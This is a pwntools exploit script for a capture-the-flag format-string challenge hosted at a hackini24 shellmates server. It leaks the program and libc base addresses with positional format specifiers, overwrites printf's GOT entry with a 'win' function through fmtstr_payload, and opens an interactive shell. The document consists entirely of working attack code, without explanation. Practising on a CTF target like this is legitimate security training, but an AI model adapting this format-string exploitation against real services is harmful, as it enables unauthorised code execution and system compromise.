from pwn import *


context.binary =elf= ELF('./chall')
libc=elf.libc
context.log_level="debug"


	
offset=0x276ca
#p=process()
p = remote('fmt2.hackini24.shellmates.club',443,ssl=True)

#%19$p main address
#%4$p starting of the buffer

p.recv()


p.sendline(b'%19$p')
main=int(p.recvline(),16)


elf.address =main - elf.symbols['main']
print(hex(elf.address))
p.recv()
p.sendline(b'%17$p')
main_libc=int(p.recvline(),16)
libc.address= main_libc - offset
print(hex(libc.address))



win =elf.symbols['win']

retmain=elf.symbols['main'] +0x012c8
payload =fmtstr_payload(6, {elf.got['printf']: win},write_size="short")

p.sendline(payload)

p.recv()

p.sendline('/bin/sh')

p.clean()
p.interactive()
